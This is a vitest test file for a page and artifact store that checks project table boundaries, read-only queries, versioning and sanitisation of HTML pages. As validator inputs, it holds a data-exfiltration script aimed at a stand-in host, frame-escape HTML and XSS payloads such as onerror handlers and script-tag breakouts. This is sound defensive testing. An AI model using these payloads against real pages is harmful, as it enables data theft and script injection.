import { existsSync, mkdirSync, mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { Workspace } from "../store/workspace.js";
import { ProjectManifest } from "./manifest.js";
import { Migrator } from "./migrate.js";
import { PageStore } from "./pages.js";
import { runDisplayQuery } from "./display.js";
import type { LoadedPage } from "./pages.js";

/** A spec page as loaded, or nothing when the page is not one. */
const specOf = (got: LoadedPage | undefined) => (got?.kind === "spec" ? got.spec : undefined);

describe("PageStore", () => {
  let root: string;
  let ws: Workspace;
  let pages: PageStore;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-pages-"));
    ws = Workspace.open(root);
    const manifest = new ProjectManifest(ws.db);
    manifest.createProject({ name: "Demo", type: "tracker" });
    pages = new PageStore(ws.db, ws, manifest);
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  it("writes, lists, and loads a valid page", () => {
    const rec = pages.write("demo", {
      id: "overview",
      title: "Overview",
      widgets: [
        {
          type: "stat",
          label: "N",
          query: "SELECT 1 AS n",
        },
      ],
    });
    expect(rec.id).toBe("overview");
    expect(pages.list("demo")).toHaveLength(1);
    const got = pages.get("overview");
    expect(specOf(got)?.title).toBe("Overview");
  });

  it("rejects invalid specs", () => {
    expect(() =>
      pages.write("demo", {
        id: "!!!",
        title: "x",
        widgets: [{ type: "stat", label: "n", query: "DELETE FROM x" }],
      }),
    ).toThrow(/invalid page/);
  });
});

describe("runDisplayQuery", () => {
  let root: string;
  let ws: Workspace;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-dq-"));
    ws = Workspace.open(root);
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  it("runs a select and rejects writes", () => {
    const res = runDisplayQuery(ws.db, "SELECT 1 AS n");
    expect(res.rows[0]).toEqual({ n: 1 });
    expect(() => runDisplayQuery(ws.db, "DELETE FROM x")).toThrow(/read-only/);
  });
});

describe("PageStore mutation targets", () => {
  let root: string;
  let ws: Workspace;
  let pages: PageStore;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-pages-mut-"));
    ws = Workspace.open(root);
    const manifest = new ProjectManifest(ws.db);
    manifest.createProject({ name: "Budget Tracker", type: "budget" });
    ws.db.exec(`CREATE TABLE budget_tracker_expenses (id INTEGER PRIMARY KEY, amount REAL)`);
    pages = new PageStore(ws.db, ws, manifest);
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  const form = (table: string): unknown => ({
    id: "budget",
    title: "Budget",
    widgets: [
      { type: "form", title: "Log", mutate: { table, columns: ["amount"] } },
    ],
  });

  it("accepts a target naming the physical table", () => {
    expect(pages.write("budget_tracker", form("budget_tracker_expenses")).id).toBe(
      "budget",
    );
  });

  it("names the namespaced table when given the logical one", () => {
    // Written unchecked, this page rendered and then failed on first save
    // with "no such table". The error belongs here, with the fix in it.
    expect(() => pages.write("budget_tracker", form("expenses"))).toThrow(
      /use "budget_tracker_expenses"/,
    );
  });

  it("rejects a target for a table that was never created", () => {
    expect(() => pages.write("budget_tracker", form("nowhere"))).toThrow(
      /systems\.migrate first/,
    );
  });
});

describe("PageStore project boundaries", () => {
  let root: string;
  let ws: Workspace;
  let pages: PageStore;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-pages-proj-"));
    ws = Workspace.open(root);
    const manifest = new ProjectManifest(ws.db);
    manifest.createProject({ name: "Budget Tracker", type: "budget" });
    manifest.createProject({ name: "Workout Log", type: "tracker" });
    ws.db.exec(`CREATE TABLE budget_tracker_expenses (id INTEGER PRIMARY KEY, amount REAL)`);
    ws.db.exec(`CREATE TABLE workout_log_sets (id INTEGER PRIMARY KEY, reps INTEGER)`);
    pages = new PageStore(ws.db, ws, manifest);
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  const page = (query: string): unknown => ({
    id: "p",
    title: "P",
    widgets: [{ type: "table", title: "T", query }],
  });

  it("accepts a page reading its own project", () => {
    expect(
      pages.write("budget_tracker", page("SELECT * FROM budget_tracker_expenses")).id,
    ).toBe("p");
  });

  it("refuses a page reading another project's tables", () => {
    // Unchecked, the page rendered fine and the only symptom was a stranger
    // sitting in someone else's project on the Projects tab.
    expect(() =>
      pages.write("budget_tracker", page("SELECT * FROM workout_log_sets")),
    ).toThrow(/belongs to project "workout_log"/);
  });

  it("does not mistake a similarly named table for another project", () => {
    ws.db.exec(`CREATE TABLE budget_tracker_workout_log_notes (id INTEGER PRIMARY KEY)`);
    expect(
      pages.write(
        "budget_tracker",
        page("SELECT * FROM budget_tracker_workout_log_notes"),
      ).id,
    ).toBe("p");
  });
});

describe("PageStore stat labels", () => {
  let root: string;
  let ws: Workspace;
  let pages: PageStore;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-pages-stat-"));
    ws = Workspace.open(root);
    const manifest = new ProjectManifest(ws.db);
    manifest.createProject({ name: "Demo", type: "tracker" });
    pages = new PageStore(ws.db, ws, manifest);
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  it("takes a stat's label from its title when only the title is given", () => {
    // Every widget but this one captions itself with title, so every model
    // tested wrote title and was rejected for a missing label.
    const rec = pages.write("demo", {
      id: "p",
      title: "P",
      widgets: [{ type: "stat", title: "Total spent", query: "SELECT 1" }],
    });
    expect(rec.id).toBe("p");
    expect(specOf(pages.get("p"))?.widgets[0]).toMatchObject({
      label: "Total spent",
    });
  });

  it("leaves an explicit label alone", () => {
    pages.write("demo", {
      id: "q",
      title: "Q",
      widgets: [
        { type: "stat", title: "Caption", label: "Real label", query: "SELECT 1" },
      ],
    });
    expect(specOf(pages.get("q"))?.widgets[0]).toMatchObject({ label: "Real label" });
  });

  it("still rejects a stat with neither", () => {
    expect(() =>
      pages.write("demo", {
        id: "r",
        title: "R",
        widgets: [{ type: "stat", query: "SELECT 1" }],
      }),
    ).toThrow(/stat requires a label/);
  });
});

describe("PageStore HTML pages", () => {
  let root: string;
  let ws: Workspace;
  let pages: PageStore;
  let t: number;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-html-"));
    ws = Workspace.open(root);
    const manifest = new ProjectManifest(ws.db);
    manifest.createProject({ name: "Budget", type: "tracker" });
    manifest.createProject({ name: "Diary", type: "notes" });
    const migrator = new Migrator(ws.db, manifest);
    migrator.migrate("budget", { op: "create_table", table: "tx", columns: [{ name: "id", type: "INTEGER", primaryKey: true }, { name: "amount", type: "REAL" }] });
    migrator.migrate("diary", { op: "create_table", table: "entries", columns: [{ name: "id", type: "INTEGER", primaryKey: true }, { name: "body", type: "TEXT" }] });
    t = 1000;
    pages = new PageStore(ws.db, ws, manifest, () => (t += 1000));
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  it("writes and loads an HTML page with its declarations, repairing escaped closing tags", () => {
    const rec = pages.writeHtml("budget", {
      id: "budget",
      title: "Budget",
      html: "<h1>Spend</h1><script>kos.query('SELECT 1')<\\/script>",
      capabilities: { writes: [{ table: "budget_tx", columns: ["amount"] }] },
      libraries: ["charts"],
      headline: { label: "Spent", query: "SELECT SUM(amount) FROM budget_tx" },
    });
    expect(rec).toMatchObject({ kind: "html", path: "projects/budget/pages/budget.html" });
    const got = pages.get("budget");
    expect(got?.kind).toBe("html");
    if (got?.kind !== "html") return;
    expect(got.page.html).toContain("</script>");
    expect(got.page.capabilities?.writes?.[0]?.table).toBe("budget_tx");
    expect(got.page.libraries).toEqual(["charts"]);
    expect(pages.list("budget")[0]?.kind).toBe("html");
  });

  it("refuses a bad page: too big, an unknown library, bad declarations, another project's table", () => {
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "a".repeat(400_001) })).toThrow(/characters/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", libraries: ["jquery"] })).toThrow(/not one KOS serves/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", capabilities: { writes: [{ table: "budget_tx" }] } })).toThrow(/editable columns/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", capabilities: { writes: [{ table: "diary_entries", columns: ["body"] }] } })).toThrow(/"diary_entries" is not a table of project "budget"/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", headline: { label: "n", query: "SELECT COUNT(*) FROM diary_entries" } })).toThrow(/headline.query: it reads "diary_entries"/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", capabilities: { writes: [{ table: "tx", columns: ["amount"] }] } })).toThrow(/use "budget_tx"/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", headline: { label: "n", query: "DELETE FROM budget_tx" } })).toThrow(/read-only/);
    expect(() => pages.writeHtml("nope", { id: "x", title: "X", html: "<p>" })).toThrow(/unknown project/);
  });

  it("refuses a page that would try to leave its frame, naming what, and lets ordinary words and code through", () => {
    const leaving = [
      "<script>location.href = 'https://x.example/?d=' + data</script>",
      "<script>window.open('https://x.example')</script>",
      "<form><input name=q></form>",
      "<script>document.querySelector('form').submit()</script>",
      '<meta http-equiv="refresh" content="0;url=https://x.example">',
      '<link rel="prerender" href="https://x.example">',
      '<a href="https://x.example" target="_blank">x</a>',
      '<a href="/x" download>x</a>',
      '<iframe src="https://x.example"></iframe>',
      '<script type="speculationrules">{}</script>',
      '<button onclick="location.assign(1)">go</button>',
    ];
    for (const html of leaving) expect(() => pages.writeHtml("budget", { id: "x", title: "X", html }), html).toThrow(/cannot leave its frame/);
    expect(() =>
      pages.writeHtml("budget", {
        id: "ok",
        title: "Ok",
        html: '<meta charset="utf-8"><p>Pick a location. Fill the form below.</p><script>const target = document.body; if (x == location) {}</script>',
      }),
    ).not.toThrow();
  });

  it("keeps every write as a version and rolls back to one, the rollback kept too", () => {
    pages.writeHtml("budget", { id: "b", title: "One", html: "<p>one</p>" });
    pages.writeHtml("budget", { id: "b", title: "Two", html: "<p>two</p>" });
    expect(pages.history("b").map((v) => v.title)).toEqual(["One", "Two"]);
    pages.rollback("b", 1);
    const got = pages.get("b");
    expect(got?.kind === "html" && got.page.html).toBe("<p>one</p>");
    expect(pages.history("b").map((v) => v.version)).toEqual([1, 2, 3]);
    expect(() => pages.rollback("b", 9)).toThrow(/no version 9/);
  });

  it("still writes, versions and renders a spec page, and lets a spec page become HTML", () => {
    pages.write("budget", { id: "old", title: "Old", widgets: [{ type: "stat", label: "N", query: "SELECT 1 AS n" }] });
    expect(pages.get("old")?.kind).toBe("spec");
    pages.writeHtml("budget", { id: "old", title: "New", html: "<p>new</p>" });
    expect(pages.get("old")?.kind).toBe("html");
    expect(existsSync(join(root, "projects/budget/pages/old.json"))).toBe(false);
    pages.rollback("old", 1);
    const back = pages.get("old");
    expect(back?.kind === "spec" && back.spec.title).toBe("Old");
  });

  it("removes a page with its history", () => {
    pages.writeHtml("budget", { id: "gone", title: "Gone", html: "<p>" });
    expect(pages.remove("gone")).toBe(true);
    expect(existsSync(join(root, "projects/budget/pages/.history/gone"))).toBe(false);
  });

  describe("artifact kinds", () => {
    const doc = (body: string): string => `<style>h1{color:var(--text)}</style><article data-doc><h1>Plan</h1>${body}</article><script>kos.theme</script>`;
    const book = { sheets: [{ name: "Spend", columns: [{ label: "Item" }, { label: "Amount", type: "currency", currency: "CAD" }], rows: [["Rent", 1200], ["Food", 300]], totals: { Amount: "sum" } }] };
    const sheet = (b: unknown): string => `<h1>Spend</h1><script type="application/json" data-sheet>${JSON.stringify(b)}</script>`;

    it("keeps a kind, a description and fonts; an older page reads as a page", () => {
      pages.writeHtml("budget", { id: "old", title: "Old", html: "<p>x</p>" });
      const rec = pages.writeHtml("budget", { id: "brief", kind: "doc", title: "Q3 brief", description: "What changed and why.", fonts: ["newsreader", "public-sans"], html: doc("<p>Hi</p>") });
      expect(rec).toMatchObject({ artifactKind: "doc", description: "What changed and why.", projectSlug: "budget" });
      expect(pages.list("budget").find((r) => r.id === "old")?.artifactKind).toBe("page");
      const got = pages.get("brief");
      expect(got?.kind === "html" && got.page).toMatchObject({ kind: "doc", fonts: ["newsreader", "public-sans"] });
    });

    it("refuses a kind without its structure, an unknown font, and a bad workbook, saying how to fix it", () => {
      expect(() => pages.writeHtml("budget", { id: "d", kind: "doc", title: "D", html: "<p>x</p>" })).toThrow(/<article data-doc>/);
      expect(() => pages.writeHtml("budget", { id: "k", kind: "deck", title: "K", html: "<main data-deck></main>" })).toThrow(/<section> per slide/);
      expect(() => pages.writeHtml("budget", { id: "s", kind: "sheet", title: "S", html: "<h1>S</h1>" })).toThrow(/data-sheet/);
      expect(() => pages.writeHtml("budget", { id: "s", kind: "sheet", title: "S", html: sheet({ sheets: [{ name: "A", columns: [] , rows: [] }] }) })).toThrow(/needs columns/);
      expect(() => pages.writeHtml("budget", { id: "s", kind: "sheet", title: "S", html: '<script type="application/json" data-sheet>{oops</script>' })).toThrow(/not JSON/);
      expect(() => pages.writeHtml("budget", { id: "f", kind: "doc", title: "F", fonts: ["comic-sans"], html: doc("") })).toThrow(/not one KOS bundles/);
      expect(() => pages.writeHtml("budget", { id: "w", kind: "slides", title: "W", html: "<p>" })).toThrow(/kind is one of/);
    });

    it("holds a sheet over a table to its own project's tables", () => {
      const live = { sheets: [{ name: "Tx", columns: [{ label: "Amount", column: "amount", type: "number" }], source: { table: "budget_tx", key: "id" } }] };
      expect(pages.writeHtml("budget", { id: "ledger", kind: "sheet", title: "Ledger", html: sheet(live) }).artifactKind).toBe("sheet");
      const theirs = { sheets: [{ name: "E", columns: [{ label: "Body", column: "body" }], source: { table: "diary_entries", key: "id" } }] };
      expect(() => pages.writeHtml("budget", { id: "peek", kind: "sheet", title: "Peek", html: sheet(theirs) })).toThrow(/diary_entries.*not a table of project "budget"/);
    });

    it("keeps a workspace artifact under artifacts/, with no tables, files or headline to reach", () => {
      const rec = pages.writeHtml(null, { id: "memo", kind: "doc", title: "Memo", html: doc("<p>Note</p>") });
      expect(rec).toMatchObject({ projectSlug: null, path: "artifacts/memo.html" });
      expect(pages.list(null).map((r) => r.id)).toEqual(["memo"]);
      expect(pages.list("budget").some((r) => r.id === "memo")).toBe(false);
      expect(pages.list().some((r) => r.id === "memo")).toBe(true);
      expect(existsSync(join(root, "artifacts/.history/memo/1.json"))).toBe(true);
      expect(() => pages.writeHtml(null, { id: "w", title: "W", html: "<p>", capabilities: { writes: [{ table: "budget_tx", columns: ["amount"] }] } })).toThrow(/belongs to no project/);
      expect(() => pages.writeHtml(null, { id: "w", title: "W", html: "<p>", headline: { label: "N", query: "SELECT 1" } })).toThrow(/belongs to no project/);
      expect(() => pages.writeHtml(null, { id: "w", title: "W", html: "<p>", capabilities: { files: true } })).toThrow(/belongs to no project/);
    });

    it("moves an artifact between a project and the workspace with its history", () => {
      pages.writeHtml("budget", { id: "move", title: "Move", html: "<p>1</p>" });
      pages.writeHtml(null, { id: "move", title: "Move", html: "<p>2</p>" });
      expect(existsSync(join(root, "projects/budget/pages/move.html"))).toBe(false);
      expect(pages.history("move").map((v) => v.version)).toEqual([1, 2]);
      pages.rollback("move", 1);
      const got = pages.get("move");
      expect(got?.kind === "html" && got.page.html).toBe("<p>1</p>");
    });

    it("keeps the owner's edit to a doc as a version, changing only the article's text", () => {
      pages.writeHtml("budget", { id: "brief", kind: "doc", title: "Brief", html: doc("<p>Before</p><aside class=\"callout\"><article>nested</article></aside>") });
      pages.applyEdit("brief", { doc: "<h1>Plan</h1><p>After, <em>edited</em></p>" });
      const got = pages.get("brief");
      expect(got?.kind === "html" && got.page.html).toBe("<style>h1{color:var(--text)}</style><article data-doc><h1>Plan</h1><p>After, <em>edited</em></p></article><script>kos.theme</script>");
      expect(pages.history("brief")).toHaveLength(2);
      pages.rollback("brief", 1);
      expect(pages.get("brief")?.kind === "html" && (pages.get("brief") as { page: { html: string } }).page.html).toContain("Before");
    });

    it("refuses an edit that carries code, or that does not fit the kind", () => {
      pages.writeHtml("budget", { id: "brief", kind: "doc", title: "Brief", html: doc("<p>x</p>") });
      for (const bad of ["<script>x()</script>", '<img src=x onerror="x()">', '<a href="javascript:x()">a</a>', "</article><script>", "<style>body{}</style>"]) {
        expect(() => pages.applyEdit("brief", { doc: bad })).toThrow(/may not hold/);
      }
      expect(() => pages.applyEdit("brief", { doc: "<iframe></iframe>" })).toThrow(/cannot leave its frame/);
      pages.writeHtml("budget", { id: "app", title: "App", html: "<p>x</p>" });
      expect(() => pages.applyEdit("app", { doc: "<p>y</p>" })).toThrow(/only a doc or a sheet/);
      expect(() => pages.applyEdit("brief", { sheet: book as never })).toThrow(/does not fit/);
      expect(pages.history("brief")).toHaveLength(1);
    });

    it("keeps the owner's edit to a sheet's data as a version, escaped so data cannot end its script", () => {
      pages.writeHtml("budget", { id: "spend", kind: "sheet", title: "Spend", html: sheet(book) });
      const edited = { ...book, sheets: [{ ...book.sheets[0]!, rows: [["Rent", 1250], ["</script><script>alert(1)</script>", 1]] }] };
      pages.applyEdit("spend", { sheet: edited as never });
      const got = pages.get("spend");
      const html = got?.kind === "html" ? got.page.html : "";
      expect(html).not.toContain("</script><script>");
      expect(html.match(/<\/script>/g)).toHaveLength(1);
      expect(JSON.parse(/data-sheet>([\s\S]*)<\/script>/.exec(html)![1]!).sheets[0].rows[1][0]).toBe("</script><script>alert(1)</script>");
      expect(() => pages.applyEdit("spend", { sheet: { sheets: [] } as never })).toThrow(/cannot be saved/);
      const moved = { sheets: [{ name: "T", columns: [{ label: "A", column: "amount" }], source: { table: "budget_tx", key: "id" } }] };
      expect(() => pages.applyEdit("spend", { sheet: moved as never })).toThrow(/which tables/);
    });

    it("removes an artifact with its history and its captures", () => {
      pages.writeHtml(null, { id: "gone", title: "Gone", html: "<p>" });
      const captures = pages.capturesDir("gone");
      mkdirSync(captures, { recursive: true });
      expect(pages.remove("gone")).toBe(true);
      expect(existsSync(captures)).toBe(false);
      expect(existsSync(join(root, "artifacts/.history/gone"))).toBe(false);
    });
  });
});
